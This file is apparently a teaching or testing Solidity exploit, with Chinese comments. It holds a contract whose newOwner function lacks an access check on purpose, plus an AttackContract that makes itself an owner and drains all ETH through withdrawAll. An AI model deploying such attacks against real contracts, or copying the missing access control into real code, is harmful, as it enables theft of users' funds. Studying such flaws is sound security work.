/*
漏洞描述：
1. MultiOwnable 合約中的 newOwner 函數未使用 onlyOwner 修飾，使任何人皆可呼叫並新增 owner，進而利用 withdrawAll 將合約餘額轉移走。
2. withdrawAll 函數直接使用 address(this).balance 進行全額轉帳，操作高度風險。

攻擊手法說明：
(1) 攻擊者部署一個攻擊合約 AttackContract。
(2) 攻擊者呼叫 MultiOwnable 的 newOwner 函數，將攻擊合約或攻擊者地址加入 owner 清單，因為未受保護。
(3) 攻擊者呼叫 TestContract 的 withdrawAll 函數，將全部餘額轉出。

下列程式碼已修正編譯錯誤，使用 Solidity 0.8.0 語法：
- 將原來的 payable fallback 函數改為 fallback() external payable。
- 保留原有漏洞以供測試攻擊流程。
*/

contract MultiOwnable {
    // 狀態變數，記錄 owner 資訊；若 owner 為 address(0) 則表示未被授權
    mapping(address => address) public owners;

    // 建構子：將部署者設為初始 owner
    constructor() {
        owners[msg.sender] = msg.sender;
    }

    modifier onlyOwner() {
        require(owners[msg.sender] != address(0), "Not an owner");
        _;
    }

    // 漏洞重點：缺少 onlyOwner 修飾，任何人均可呼叫此函數新增 owner
    function newOwner(address _owner) external returns (bool) {
        require(_owner != address(0), "Invalid owner address");
        owners[_owner] = msg.sender;
        return true;
    }
}

contract TestContract is MultiOwnable {
    // withdrawAll 函數，使用全額轉移合約餘額，僅受 owner 許可
    function withdrawAll() external onlyOwner {
        payable(msg.sender).transfer(address(this).balance);
    }

    // 修改後的 fallback 函數，可接收 ETH
    fallback() external payable {}

    // 若要專門接收純粹 ETH，亦可使用 receive 函數
    receive() external payable {}
}

// 攻擊合約，演示如何利用漏洞進行攻擊
contract AttackContract {
    TestContract public target;

    // 部署時傳入目標合約地址
    constructor(TestContract _target) {
        target = _target;
    }

    // 發起攻擊流程
    function attack() public {
        // 漏洞利用步驟 1：呼叫未受保護的 newOwner 將攻擊者地址登記為 owner
        target.newOwner(address(this));

        // 漏洞利用步驟 2：呼叫 withdrawAll，將所有 ETH 轉出
        target.withdrawAll();
    }

    // fallback 接收 ETH
    fallback() external payable {}

    receive() external payable {}

    // 攻擊者可以利用此函數將接收到的 ETH 轉出
    function withdrawEther() public {
        payable(msg.sender).transfer(address(this).balance);
    }
}
